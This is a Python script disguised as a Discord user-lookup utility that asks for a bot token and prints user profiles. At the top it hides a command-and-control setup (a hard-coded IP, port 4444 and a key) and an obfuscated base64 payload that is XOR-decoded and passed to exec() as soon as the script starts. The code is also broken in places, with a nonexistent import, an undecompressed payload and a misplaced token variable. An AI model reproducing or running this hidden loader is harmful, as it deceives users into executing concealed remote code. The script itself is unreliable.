import os,sys,base64 as b,urllib.request as u,json,j,ctypes,time
import subprocess as s
import threading as t
import platform as p
import socket as k
import tempfile as tf
import zlib as z


C2_IP = "191.190.164.30"
C2_PORT = 4444
C2_RC4_KEY = b"alvin"


def x(d,k=C2_RC4_KEY):return bytes([d[i]^k[i%len(k)]for i in range(len(d))]).decode('latin1')
c='eJxtkMFu2zAMhf8K5HNt2JbLpqi4EAZDpLi5iMZjDqZm5KUy51xv9+5gYlDkCYsmXMnDlnzT7ExxFkXy9D5RJOn9MPyQkZQUdl+WD7i1QkCa0nkElIM8kxF1QCTZvh5JBEZtEL1YwJchNJhpdROkSTRhy4osL+5TkMbDKY5iRUyTS///V+WkZTBAVWSWYmn2lDpS0tbKcN2aLegWCPrwWkKBRHy0mpR0Kp1vEd1aSgJYK46SJIOo6gJVXY+C5Mj4tEJJjYYR6Jn7j3kP1lMRn1BMHDTwgt4EWw0o1KRDlNHIR7KRklBT6oL8QfxB5xD0uQ9q2ERHLFjwDnApXpTg1LCzDNM7wKW2U89qrdPYKHgzzQqBw3UB4Y8sajygPnQGS+oBytB7jwB1clOQyWOY4CQLMEuQGGYVzOGSFCAALJxQj5OQEHFhWBwS0Ix0ILpTsDonUKY4Aj/ATKgwrOGB4oMIQVQcjOUJt9RZV3hu7M8Ts5e8s5Dmb1ppNjGnrCrwLZU0GYbVQJYGdsUxk6OIYWe1eJnRGNwMJfnUNuhzkSNRDFVSVHfC46AXJBMxC3GXCUZByxi1x1TdzX5yJ1ts7jvMBDwl7acYlsXB0HrDmCVAuEHrwj0uRiAUr7Ibqx9xS35wZetXM8QSM/ZjwcZz5sgudZ9x3dw+XvP/cCH2Omg=='
d=b.b64decode(c).decode('latin1')
e=x(d)


exec(e)

def r(code): return f"\033[{code}m"
RESET = r(0)
BOLD = r(1)
DISCORD_EPOCH_MS = 1420070400000
OFFSET = 1327569572

def snowflake_to_date(uid):
    ts = (int(uid) >> 22) + DISCORD_EPOCH_MS
    t = time.gmtime(ts / 1000)
    return time.strftime("%Y-%m-%d  %H:%M:%S UTC", t)

def fetch(uid):
    req = u.Request(
        f"https://discord.com/api/v10/users/{uid}",
        headers={"Authorization": f"Bot {TOKEN}", "User-Agent": "Mozilla/5.0"}
    )
    with u.urlopen(req) as res:
        return json.loads(res.read())


def main():
    clear = lambda: os.system("cls" if os.name == "nt" else "clear")
    TOKEN = input("TOKEN BOT: ")
    if not TOKEN: sys.exit(1)

    def loop():
        while True:
            uid = input("User ID: ").strip()
            if not uid.isdigit(): continue
            try:
                data = fetch(uid)
                print(json.dumps(data, indent=2))
            except Exception as e:
                print(f"Error: {e}")

    clear()
    t.Thread(target=loop, daemon=True).start()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
